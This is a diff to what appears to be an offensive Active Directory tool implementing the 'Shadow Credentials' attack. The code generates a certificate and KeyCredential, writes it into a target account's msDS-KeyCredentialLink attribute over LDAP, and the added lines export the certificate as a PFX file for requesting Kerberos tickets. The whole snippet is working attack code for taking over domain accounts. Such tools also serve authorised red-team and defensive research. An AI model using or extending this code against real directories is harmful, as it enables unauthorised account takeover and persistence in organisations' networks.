@@ -266,7 +266,8 @@ class ShadowCredentials(object):
         certificate = X509Certificate2(subject=self.target_samname, keySize=2048)
         logging.info("Certificate generated")
         logging.info("Generating KeyCredential")
-        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
+        guid = Guid()
+        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=guid, owner=self.target_dn, currentTime=DateTime())
         logging.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
         logging.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
         self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
@@ -284,6 +285,9 @@ class ShadowCredentials(object):
             self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.ldap_session.result['result'] == 0:
                 logging.info("Updated the msDS-KeyCredentialLink attribute of the target object")
+                certificate.ExportPFX(password=password, path_to_file=path, friendlyname=guid.toFormatD().encode())
+                # logging.info("Saved PFX certificate at path: %s" % path)
+                # certificate.ExportPEM(path_to_file=path)
                 # todo : print the cert in a Rubeus/getTGT synthax, or: save it to a file, confirm it's saved, show Rubeus/getTGT synthax
             else:
                 if self.ldap_session.result['result'] == 50:
